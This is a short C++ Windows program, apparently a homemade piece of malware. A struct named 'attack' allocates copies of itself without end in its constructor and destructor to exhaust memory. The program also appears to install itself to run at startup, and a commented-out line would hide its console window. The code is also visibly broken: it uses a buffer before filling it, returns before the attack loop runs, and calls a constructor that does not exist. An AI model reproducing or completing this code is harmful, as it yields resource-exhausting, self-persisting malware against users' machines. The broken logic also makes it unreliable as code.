#include <cstdlib>
#include <windows.h>  
#include "TlHelp32.h"
#include <iostream>
#include <fstream>
#include <sstream>
#include "Files.h"
#define UNICODE 1
using namespace std;

struct attack{
	attack(){
		new attack();
		new attack();
		//cout << this << endl;
	}
	~attack(){
		new attack();
		new attack();
		cout << this << endl;
	}
};

void attacking(string startCommand){
	while(true){
		try{
			for(int i = 0; i < 10; i++){
				new attack();

			}
		}catch(exception e){
			//new char[107370900];
			//system(startCommand.c_str());
			//new char[107370900];
			//system(startCommand.c_str());
			//attack(startCommand);
		}
		attack(startCommand);
	}
}
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int cmdShow){
	char  szPath[MAX_PATH];
	PSTR  lpFilename;
	lpFilename = (strrchr(szPath, '\\') + 1);
	beginStartup(szPath);
	//ShowWindow( GetConsoleWindow(), SW_HIDE );
	if (GetModuleFileName(NULL, szPath, sizeof szPath) == 0) return -1;
	std::string startupPath = getStartupPath(szPath);
	string startCommand;
	cout << startCommand << endl;
	return 0;
	startCommand = startupPath;
	attacking(startCommand);
	return 0;
}
